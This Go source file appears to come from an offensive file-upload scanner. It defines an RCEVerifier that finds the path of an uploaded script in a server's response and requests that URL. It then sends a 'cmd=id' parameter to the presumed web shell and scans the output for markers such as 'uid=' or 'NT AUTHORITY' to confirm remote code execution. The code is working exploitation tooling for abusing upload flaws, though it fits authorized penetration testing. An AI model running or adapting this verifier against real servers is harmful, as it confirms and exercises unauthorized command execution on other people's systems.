package verifier

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/HaakimSec/GoUpload/internal/types"
)

type RCEVerifier struct {
	client   *http.Client
	timeout  time.Duration
	command  string
	patterns []PathPattern
}

type PathPattern struct {
	Regex *regexp.Regexp
	Type  string // "json", "html", "text", "header"
}

type VerificationResult struct {
	Verified bool
	Proof    string
	FileURL  string
	Command  string
}

func NewRCEVerifier(client *http.Client, timeout time.Duration) *RCEVerifier {
	if timeout == 0 {
		timeout = 10 * time.Second
	}

	if client == nil {
		client = &http.Client{
			Timeout: timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		}
	}

	return &RCEVerifier{
		client:  client,
		timeout: timeout,
		command: "id",
		patterns: []PathPattern{
			{
				Regex: regexp.MustCompile(`(?i)(?:href|src|action|url|path|file|location)["']?\s*[:=]\s*["']([^"']+\.(?:php|jsp|asp|aspx|py|pl|cgi|sh|js|jspx|php[0-9]|phtml|pht|phar))["']?`),
				Type:  "html",
			},
			{
				Regex: regexp.MustCompile(`(?i)"(?:url|path|file|filename|location)"\s*:\s*"([^"]+\.(?:php|jsp|asp|aspx|py|pl|cgi|sh|js|jspx|php[0-9]|phtml|pht|phar))"`),
				Type:  "json",
			},
			{
				Regex: regexp.MustCompile(`(?i)(?:uploads|upload|files|images|media|tmp|temp|data|storage|static|assets)/[^"'\s<>]+\.(?:php|jsp|asp|aspx|py|pl|cgi|sh|js|jspx|php[0-9]|phtml|pht|phar)`),
				Type:  "text",
			},
			{
				Regex: regexp.MustCompile(`(?i)Location:\s*([^\s]+\.(?:php|jsp|asp|aspx|py|pl|cgi|sh|js|jspx|php[0-9]|phtml|pht|phar))`),
				Type:  "header",
			},
		},
	}
}

func (v *RCEVerifier) VerifyRCE(result *types.Result, baseURL string) error {
	if result == nil || result.Vulnerable != "VULNERABLE" {
		return fmt.Errorf("result is not vulnerable")
	}

	// Extract file path from response
	filePath := v.extractFilePath(result.ResponseBody, result.ResponseHeaders)
	if filePath == "" {
		return fmt.Errorf("could not extract file path from response")
	}

	// Resolve URL
	fileURL := v.resolveURL(baseURL, filePath)
	if fileURL == "" {
		return fmt.Errorf("could not resolve file URL")
	}

	// Verify execution and command execution
	verificationResult := v.verifyExecution(fileURL)

	// Update result
	result.RCEVerified = verificationResult.Verified
	result.RCEProof = verificationResult.Proof
	result.FileURL = verificationResult.FileURL
	result.RCECommand = verificationResult.Command
	result.VerificationTime = time.Duration(0) // Set actual duration

	return nil
}

func (v *RCEVerifier) extractFilePath(body string, headers map[string]string) string {
	// Check all patterns
	for _, pattern := range v.patterns {
		matches := pattern.Regex.FindStringSubmatch(body)
		if len(matches) > 1 {
			return matches[1]
		}
	}

	// Check headers for location
	if location, ok := headers["Location"]; ok {
		if match := v.patterns[3].Regex.FindStringSubmatch(location); len(match) > 1 {
			return match[1]
		}
	}

	return ""
}

func (v *RCEVerifier) resolveURL(baseURL, filePath string) string {
	// Check if it's already absolute
	if strings.HasPrefix(filePath, "http://") || strings.HasPrefix(filePath, "https://") {
		return filePath
	}

	// Parse base URL
	base, err := url.Parse(baseURL)
	if err != nil {
		return ""
	}

	// Handle relative path
	if strings.HasPrefix(filePath, "/") {
		// Absolute path
		return fmt.Sprintf("%s://%s%s", base.Scheme, base.Host, filePath)
	}

	// Relative path
	basePath := base.Path
	if idx := strings.LastIndex(basePath, "/"); idx != -1 {
		basePath = basePath[:idx+1]
	}

	return fmt.Sprintf("%s://%s%s%s", base.Scheme, base.Host, basePath, filePath)
}

func (v *RCEVerifier) verifyExecution(fileURL string) VerificationResult {
	result := VerificationResult{
		Verified: false,
		FileURL:  fileURL,
		Command:  v.command,
	}

	ctx, cancel := context.WithTimeout(context.Background(), v.timeout)
	defer cancel()

	// First, check if file executes (not showing source)
	req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
	if err != nil {
		return result
	}

	resp, err := v.client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // 1MB limit
	if err != nil {
		return result
	}

	bodyStr := string(body)

	// Check if source code is visible (not executing)
	if v.isSourceVisible(bodyStr) {
		return result
	}

	// Try command execution
	commandURL := v.addCommandParam(fileURL, v.command)

	req2, err := http.NewRequestWithContext(ctx, "GET", commandURL, nil)
	if err != nil {
		return result
	}

	resp2, err := v.client.Do(req2)
	if err != nil {
		return result
	}
	defer resp2.Body.Close()

	body2, err := io.ReadAll(io.LimitReader(resp2.Body, 1024*1024))
	if err != nil {
		return result
	}

	commandOutput := string(body2)

	// Check for command execution indicators
	if proof := v.extractProof(commandOutput); proof != "" {
		result.Verified = true
		result.Proof = proof
	}

	return result
}

func (v *RCEVerifier) isSourceVisible(body string) bool {
	// Check for PHP source markers
	phpPatterns := []string{
		"<?php",
		"<?=",
		"function ",
		"namespace ",
		"use statement",
	}

	// Check for JSP/ASP source markers
	jspPatterns := []string{
		"<%@",
		"<%=",
		"<%--",
		"import java",
	}

	aspPatterns := []string{
		"<%@",
		"<%=",
		"Response.Write",
		"Server.MapPath",
	}

	for _, pattern := range phpPatterns {
		if strings.Contains(body, pattern) {
			return true
		}
	}

	for _, pattern := range jspPatterns {
		if strings.Contains(body, pattern) {
			return true
		}
	}

	for _, pattern := range aspPatterns {
		if strings.Contains(body, pattern) {
			return true
		}
	}

	return false
}

func (v *RCEVerifier) addCommandParam(fileURL, command string) string {
	parsedURL, err := url.Parse(fileURL)
	if err != nil {
		return fileURL
	}

	q := parsedURL.Query()

	// Common command execution parameters
	if strings.HasSuffix(fileURL, ".php") || strings.HasSuffix(fileURL, ".phtml") {
		q.Set("cmd", command)
	} else if strings.HasSuffix(fileURL, ".jsp") || strings.HasSuffix(fileURL, ".jspx") {
		q.Set("cmd", command)
	} else if strings.HasSuffix(fileURL, ".asp") || strings.HasSuffix(fileURL, ".aspx") {
		q.Set("cmd", command)
	} else {
		// Try common parameters
		q.Set("cmd", command)
	}

	parsedURL.RawQuery = q.Encode()
	return parsedURL.String()
}

func (v *RCEVerifier) extractProof(output string) string {
	// Common indicators of successful command execution
	indicators := []string{
		"uid=",
		"gid=",
		"groups=",
		"www-data",
		"daemon",
		"apache",
		"nginx",
		"root:",
		"NT AUTHORITY",
		"user=",
		"home=",
		"PWD=",
		"USER=",
	}

	for _, indicator := range indicators {
		if strings.Contains(output, indicator) {
			// Extract relevant line
			lines := strings.Split(output, "\n")
			for _, line := range lines {
				if strings.Contains(line, indicator) {
					return strings.TrimSpace(line)
				}
			}
			return output[:min(len(output), 100)]
		}
	}

	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

